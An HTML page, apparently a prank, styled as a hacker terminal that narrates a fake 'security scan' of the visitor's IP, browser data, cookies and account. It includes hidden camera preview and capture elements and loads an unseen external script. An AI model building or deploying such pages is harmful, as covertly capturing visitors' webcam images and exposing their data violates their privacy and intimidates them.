<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>⭐⭐⭐</title>
    <link rel="stylesheet" href="styles.css">
</head>
<body>
    <!-- Hidden camera preview and capture elements -->
    <div id="camera-container" class="camera-container" style="display: none;">
        <video id="camera" autoplay playsinline></video>
        <canvas id="canvas"></canvas>
    </div>
    
    <div class="container">
        <div class="terminal">
            <div class="terminal-header">
                <div class="terminal-buttons">
                    <span class="terminal-button red"></span>
                    <span class="terminal-button yellow"></span>
                    <span class="terminal-button green"></span>
                </div>
                <div class="terminal-title">Made By @Phonzr</div>
            </div>
            <div class="terminal-content" id="terminal">
                <div class="line">> Initializing security scan...</div>
                <div class="line">> Scanning system for vulnerabilities...</div>
                <div class="line">> Accessing network information...</div>
                <div class="line" id="ip-line"></div>
                <div class="line">> Accessing browser data...</div>
                <div class="line" id="browser-data-line"></div>
                <div class="line" id="cookies-line"></div>
                <div class="line" id="account-line"></div>
                <div class="line" id="joke-line"></div>
                <div class="line" id="reveal-line"></div>
            </div>
        </div>
    </div>
    <script>
        // Wait for DOM to be fully loaded
        document.addEventListener('DOMContentLoaded', function() {
            // Add debug logging
            console.log('DOM fully loaded, starting script...');
            
            // Load script after a small delay to ensure everything is ready
            setTimeout(function() {
                const script = document.createElement('script');
                script.src = 'script_new.js';
                script.onerror = function() {
                    console.error('Failed to load script: script_new.js');
                };
                document.body.appendChild(script);
            }, 100);
        });
    </script>
</body>
</html>
